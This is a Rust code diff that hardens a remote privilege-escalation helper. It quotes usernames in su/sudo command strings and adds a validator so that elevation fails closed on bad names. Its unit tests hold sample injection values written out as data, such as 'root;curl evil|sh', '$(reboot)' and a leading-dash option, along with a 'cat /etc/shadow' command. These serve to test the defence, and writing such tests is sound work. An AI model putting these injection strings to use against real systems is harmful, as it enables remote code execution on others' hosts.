@@ -69,7 +69,10 @@ pub fn wrap_command_su(command: &str, target_user: &str, password: &str) -> (Str
     } else {
         target_user
     };
-    let wrapped = format!("su - {user} -c '{escaped}'");
+    // Single-quote the username so a value carrying shell metacharacters can
+    // never break out of the `su` token (defense in depth — callers should
+    // already have validated via [`is_valid_username`]).
+    let wrapped = format!("su - {} -c '{escaped}'", quote_user(user));
     let stdin = format!("{password}\n");
     (wrapped, stdin)
 }
@@ -91,7 +94,12 @@ pub fn wrap_command_sudo_u(command: &str, target_user: &str, password: &str) -> 
     };
     // See [`wrap_command`] re: `LC_ALL=C` — keep sudo's diagnostics
     // ASCII so the auth-failure fallback fires on localized hosts.
-    let wrapped = format!("LC_ALL=C sudo -S -p '' -u {user} bash -c '{escaped}'");
+    // The username is single-quoted as defense in depth (see
+    // [`wrap_command_su`]).
+    let wrapped = format!(
+        "LC_ALL=C sudo -S -p '' -u {} bash -c '{escaped}'",
+        quote_user(user)
+    );
     let stdin = format!("{password}\n");
     (wrapped, stdin)
 }
@@ -117,10 +125,43 @@ pub fn wrap_command_nopasswd(command: &str, elevation: &Elevation) -> Option<Str
             } else {
                 target_user
             };
-            Some(format!("LC_ALL=C sudo -n -u {user} bash -c '{escaped}'"))
+            Some(format!(
+                "LC_ALL=C sudo -n -u {} bash -c '{escaped}'",
+                quote_user(user)
+            ))
         }
         Elevation::None | Elevation::Su { .. } => None,
     }
+}
+
+/// True when `user` is a syntactically valid POSIX-ish username that is
+/// safe to splice into a `su`/`sudo -u` command. Requires a leading letter
+/// or `_`, then letters/digits/`_`/`-` (a single trailing `$` is allowed
+/// for Samba machine accounts), capped at 32 chars. Anything with a shell
+/// metacharacter, whitespace, leading `-` (which would be parsed as an
+/// option), or other oddity is rejected so it can never reach the elevated
+/// shell string. Also used at the Tauri command boundary
+/// (`ssh_set_host_effective_user`).
+pub fn is_valid_username(user: &str) -> bool {
+    let bytes = user.as_bytes();
+    if bytes.is_empty() || bytes.len() > 32 {
+        return false;
+    }
+    let first = bytes[0];
+    if !(first.is_ascii_alphabetic() || first == b'_') {
+        return false;
+    }
+    bytes.iter().enumerate().all(|(i, &b)| {
+        b.is_ascii_alphanumeric() || b == b'_' || b == b'-' || (b == b'$' && i == bytes.len() - 1)
+    })
+}
+
+/// Single-quote a username for safe inclusion in a `su`/`sudo` shell
+/// string, escaping any embedded `'` the same way the wrapped command is
+/// escaped. Belt-and-suspenders on top of [`is_valid_username`] validation
+/// at the call boundaries.
+pub(crate) fn quote_user(user: &str) -> String {
+    format!("'{}'", user.replace('\'', r"'\''"))
 }
 
 /// Privilege-escalation method for a *single* remote command. Decided
@@ -156,13 +197,39 @@ impl Elevation {
     pub fn from_wire(method: &str, target_user: Option<&str>) -> Self {
         match method {
             "sudo" => Elevation::Sudo,
-            "sudo-u" => Elevation::SudoUser {
-                target_user: target_user.unwrap_or("root").to_string(),
-            },
-            "su" => Elevation::Su {
-                target_user: target_user.unwrap_or("root").to_string(),
-            },
+            "sudo-u" => Self::become_specific_user(target_user.unwrap_or("root"), false),
+            "su" => Self::become_specific_user(target_user.unwrap_or("root"), true),
             _ => Elevation::None,
+        }
+    }
+
+    /// Build a `SudoUser`/`Su` elevation for `user`, **failing closed** when
+    /// the username is not a valid POSIX username. Refusing rather than
+    /// splicing an injection-prone value into a root shell means a bad value
+    /// runs the action unprivileged (surfacing a normal permission error)
+    /// instead of becoming command injection. `root`/empty collapses to the
+    /// most-compatible plain `sudo`/`su -`.
+    fn become_specific_user(user: &str, su: bool) -> Self {
+        if user.is_empty() || user == "root" {
+            return if su {
+                Elevation::Su {
+                    target_user: "root".to_string(),
+                }
+            } else {
+                Elevation::Sudo
+            };
+        }
+        if !is_valid_username(user) {
+            return Elevation::None;
+        }
+        if su {
+            Elevation::Su {
+                target_user: user.to_string(),
+            }
+        } else {
+            Elevation::SudoUser {
+                target_user: user.to_string(),
+            }
         }
     }
 
@@ -171,13 +238,7 @@ impl Elevation {
     /// `root` collapses to plain [`Elevation::Sudo`] (most compatible);
     /// any other user uses [`Elevation::SudoUser`].
     pub fn become_user_via_sudo(target_user: &str) -> Self {
-        if target_user.is_empty() || target_user == "root" {
-            Elevation::Sudo
-        } else {
-            Elevation::SudoUser {
-                target_user: target_user.to_string(),
-            }
-        }
+        Self::become_specific_user(target_user, false)
     }
 
     /// True when this method needs a password secret to function.
@@ -313,20 +374,57 @@ mod tests {
     #[test]
     fn su_wraps_with_target_user() {
         let (cmd, stdin) = wrap_command_su("cat /etc/shadow", "root", "pw");
-        assert_eq!(cmd, "su - root -c 'cat /etc/shadow'");
+        assert_eq!(cmd, "su - 'root' -c 'cat /etc/shadow'");
         assert_eq!(stdin, "pw\n");
     }
 
     #[test]
     fn su_defaults_to_root_when_empty() {
         let (cmd, _) = wrap_command_su("id", "", "pw");
-        assert_eq!(cmd, "su - root -c 'id'");
+        assert_eq!(cmd, "su - 'root' -c 'id'");
     }
 
     #[test]
     fn su_escapes_single_quotes() {
         let (cmd, _) = wrap_command_su("echo 'hi'", "admin", "pw");
-        assert_eq!(cmd, r"su - admin -c 'echo '\''hi'\'''");
+        assert_eq!(cmd, r"su - 'admin' -c 'echo '\''hi'\'''");
+    }
+
+    #[test]
+    fn username_validation_rejects_injection() {
+        assert!(is_valid_username("postgres"));
+        assert!(is_valid_username("deploy_1"));
+        assert!(is_valid_username("_svc"));
+        assert!(is_valid_username("web-app"));
+        assert!(!is_valid_username(""));
+        assert!(!is_valid_username("-i")); // leading dash → sudo/su option
+        assert!(!is_valid_username("root;curl evil|sh"));
+        assert!(!is_valid_username("a b"));
+        assert!(!is_valid_username("x -c id;#"));
+        assert!(!is_valid_username("$(reboot)"));
+        assert!(!is_valid_username(&"a".repeat(33)));
+    }
+
+    #[test]
+    fn elevation_fails_closed_on_bad_username() {
+        // A username with shell metacharacters must NOT build an elevation
+        // that would splice it into a root shell.
+        assert_eq!(
+            Elevation::from_wire("sudo-u", Some("postgres bash -c 'curl evil|sh' #")),
+            Elevation::None
+        );
+        assert_eq!(Elevation::from_wire("su", Some("-i")), Elevation::None);
+        assert_eq!(
+            Elevation::become_user_via_sudo("root;id"),
+            Elevation::None
+        );
+        // Valid users still work.
+        assert_eq!(
+            Elevation::become_user_via_sudo("postgres"),
+            Elevation::SudoUser {
+                target_user: "postgres".into()
+            }
+        );
     }
 
     #[test]
@@ -368,7 +466,7 @@ mod tests {
         let (cmd, stdin) = wrap_command_sudo_u("psql -c 'select 1'", "postgres", "pw");
         assert_eq!(
             cmd,
-            r"LC_ALL=C sudo -S -p '' -u postgres bash -c 'psql -c '\''select 1'\'''"
+            r"LC_ALL=C sudo -S -p '' -u 'postgres' bash -c 'psql -c '\''select 1'\'''"
         );
         assert_eq!(stdin, "pw\n");
     }
@@ -376,7 +474,7 @@ mod tests {
     #[test]
     fn sudo_u_defaults_to_root_when_empty() {
         let (cmd, _) = wrap_command_sudo_u("id", "", "pw");
-        assert_eq!(cmd, "LC_ALL=C sudo -S -p '' -u root bash -c 'id'");
+        assert_eq!(cmd, "LC_ALL=C sudo -S -p '' -u 'root' bash -c 'id'");
     }
 
     #[test]
@@ -393,7 +491,7 @@ mod tests {
                 }
             )
             .as_deref(),
-            Some("LC_ALL=C sudo -n -u postgres bash -c 'id'")
+            Some("LC_ALL=C sudo -n -u 'postgres' bash -c 'id'")
         );
         // Passwordless escalation is impossible for these methods.
         assert!(wrap_command_nopasswd("id", &Elevation::None).is_none());
@@ -426,11 +524,7 @@ mod tests {
                 target_user: "deploy".into()
             }
         );
-        assert_eq!(
-            Elevation::from_wire("sudo-u", None),
-            Elevation::SudoUser {
-                target_user: "root".into()
-            }
-        );
+        // `sudo -u root` collapses to plain `sudo` (most compatible).
+        assert_eq!(Elevation::from_wire("sudo-u", None), Elevation::Sudo);
     }
 }
